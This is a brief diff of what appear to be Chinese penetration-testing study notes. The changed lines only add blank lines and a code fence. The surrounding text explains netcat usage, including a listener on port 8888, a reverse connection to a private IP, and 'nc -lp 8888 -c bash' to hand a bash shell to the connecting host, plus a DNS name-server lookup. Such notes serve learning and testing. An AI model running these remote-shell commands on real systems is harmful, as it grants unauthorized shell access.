@@ -59,6 +59,10 @@ b主机为linux
 b:nc -lp 8888 在b主机上发起一个监听端口等待a主机的连接  ----监听机获得连接机的cmd执行权限
 反向连接a:nc -nv 192.168.1.2 8888 
 b:nc -lp 8888 -c bash 使用-c参数将bash丢给连接方  -----a主机获得b主机的shell执行
+
 ```
 
 host -t ns megacorpoe.com 其中-t后面的参数可以修改为任意类型参数，比如mx，
+
+```
+
